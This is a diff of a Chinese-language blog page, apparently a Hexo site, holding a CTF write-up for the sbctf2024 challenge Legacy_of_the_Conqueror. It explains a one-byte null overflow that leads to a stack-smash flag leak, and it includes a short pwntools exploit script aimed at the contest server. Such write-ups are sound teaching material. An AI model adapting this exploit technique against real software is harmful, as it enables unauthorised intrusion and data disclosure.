@@ -21,22 +21,24 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"hxblog.fun","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.23.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-light","dark":"atom-one-light"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="复现一下sbctf2024">
+    <meta name="description" content="复现一下 sbctf2024">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sbctf2024">
 <meta property="og:url" content="https://hxblog.fun/2024/01/25/sbctf2024/index.html">
 <meta property="og:site_name" content="hx294">
-<meta property="og:description" content="复现一下sbctf2024">
+<meta property="og:description" content="复现一下 sbctf2024">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://hxblog.fun/2024/01/25/sbctf2024/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.png">
 <meta property="og:image" content="https://hxblog.fun/2024/01/25/sbctf2024/main.png">
+<meta property="og:image" content="https://hxblog.fun/2024/01/25/sbctf2024/read_story.png">
 <meta property="og:image" content="https://hxblog.fun/2024/01/25/sbctf2024/update_story.png">
 <meta property="og:image" content="https://hxblog.fun/2024/01/25/sbctf2024/input.png">
 <meta property="og:image" content="https://hxblog.fun/2024/01/25/sbctf2024/%E4%BA%8C%E7%BA%A7%E6%8C%87%E9%92%88.png">
 <meta property="article:published_time" content="2024-01-25T01:52:49.000Z">
-<meta property="article:modified_time" content="2025-04-09T06:28:04.793Z">
+<meta property="article:modified_time" content="2025-07-05T13:15:43.768Z">
 <meta property="article:author" content="hx294">
 <meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://hxblog.fun/2024/01/25/sbctf2024/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.png">
 
@@ -157,12 +159,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -192,8 +194,10 @@
   </div>
   <ul class="popular-posts">
     <li class="popular-posts-item">
-      <a class="popular-posts-link" href="/" rel="bookmark">
-      
+      <a class="popular-posts-link" href="/2025/05/25/how2heap/" rel="bookmark">
+        <time class="popular-posts-time">2025-05-25</time>
+        <br>
+      how2heap
       </a>
     </li>
   </ul>
@@ -247,15 +251,6 @@
 
       <time title="创建时间：2024-01-25 09:52:49" itemprop="dateCreated datePublished" datetime="2024-01-25T09:52:49+08:00">2024-01-25</time>
     </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-        </span>
-    </span>
 
   
     <span class="post-meta-break"></span>
@@ -281,25 +276,30 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>复现一下sbctf2024 <span id="more"></span></p>
+    <div class="post-body" itemprop="articleBody"><p>复现一下 sbctf2024</p>
+<span id="more"></span>
 <h1 id="week-1">week 1</h1>
 <h2 id="legacy_of_the_conqueror">Legacy_of_the_Conqueror</h2>
 <p>检查保护机制：<br />
-<img src="保护机制.png" alt="保护机制" /> 用ida看源码：<br />
-<img src="main.png" alt="main" />
-经典菜单，输入变量v3，当v3为1时进入read_story，为2进入update_story，为3退出循环</p>
-<p>v3为1时，查看read_story,把flag写入了以flag为开头地址的bss段中: <img
-src="read_story.png" alt="read_story" /></p>
-<p>v3为2时，查看update_story,咋一看没有溢出，但是打开input函数，发现可以溢出一个字节0x00,由于打开your_story
-时，文件描述符为3，所以可以将其覆盖为0。<br />
+<img src="保护机制.png" alt="保护机制" /> 用 ida 看源码：<br />
+<img src="main.png" alt="main" /> 经典菜单，输入变量 v3，当 v3 为 1
+时进入 read_story，为 2 进入 update_story，为 3 退出循环</p>
+<p>v3 为 1 时，查看 read_story,把 flag 写入了以 flag 为开头地址的 bss
+段中: <img src="read_story.png" alt="read_story" /></p>
+<p>v3 为 2 时，查看 update_story,咋一看没有溢出，但是打开 input
+函数，发现可以溢出一个字节 0x00,由于打开 your_story 时，文件描述符为
+3，所以可以将其覆盖为 0。<br />
 <img src="update_story.png" alt="update_story" /> <img src="input.png"
 alt="input" /></p>
-<p>将v2覆盖为0后，read便从标准输入，写入到v3。便可以发生栈溢出，通过<span class="exturl" data-url="aHR0cDovLzB4NGM0My5jbi8yMDE4LzEwMTMvc3RhY2stb3ZlcmZsb3ctc21hc2gtdXRpbGl6YXRpb24v">stack
-smash(破坏canary)<i class="fa fa-external-link-alt"></i></span>来解决。</p>
-<p>首先找出偏移=v1到程序名的一级指针的偏移量-v2大小，然后找到flag的地址，构成payload。
-注意下图这个二级指针的地址不是我们要的，它是main函数的参数,要的是它指向的一级指针的地址。
-<img src="二级指针.png" alt="二级指针" /></p>
-<p>exp: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &quot;Debug&quot;</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&#x27;47.76.71.50&#x27;,20148)</span><br><span class="line">flag = 0x404060</span><br><span class="line">def read_story() :</span><br><span class="line">    p.sendline(b&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def update_story() :</span><br><span class="line">    p.sendline(b&#x27;2&#x27;)</span><br><span class="line">    payload =  0x1a4 * b&#x27;a&#x27;+pack(flag,bits=64)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_story()</span><br><span class="line">update_story()</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>将 v2 覆盖为 0 后，read 便从标准输入，写入到
+v3。便可以发生栈溢出，通过<span class="exturl" data-url="aHR0cDovLzB4NGM0My5jbi8yMDE4LzEwMTMvc3RhY2stb3ZlcmZsb3ctc21hc2gtdXRpbGl6YXRpb24v">stack
+smash(破坏 canary)<i class="fa fa-external-link-alt"></i></span>来解决。</p>
+<p>首先找出偏移=v1 到程序名的一级指针的偏移量-v2 大小，然后找到 flag
+的地址，构成 payload。 注意下图这个二级指针的地址不是我们要的，它是 main
+函数的参数,要的是它指向的一级指针的地址。 <img src="二级指针.png"
+alt="二级指针" /></p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &quot;Debug&quot;</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&#x27;47.76.71.50&#x27;,20148)</span><br><span class="line">flag = 0x404060</span><br><span class="line">def read_story() :</span><br><span class="line">    p.sendline(b&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def update_story() :</span><br><span class="line">    p.sendline(b&#x27;2&#x27;)</span><br><span class="line">    payload =  0x1a4 * b&#x27;a&#x27;+pack(flag,bits=64)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_story()</span><br><span class="line">update_story()</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="week-2">week 2</h1>
 
     </div>
@@ -311,6 +311,7 @@ smash(破坏canary)<i class="fa fa-external-link-alt"></i></span>来解决。</p
     <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
           </div>
 
         
@@ -363,7 +364,7 @@ smash(破坏canary)<i class="fa fa-external-link-alt"></i></span>来解决。</p
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">38 分钟</span>
+    <span title="站点阅读时长">40 分钟</span>
   </span>
 </div>
   <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9taXN0Lw==">NexT.Mist</span> 强力驱动
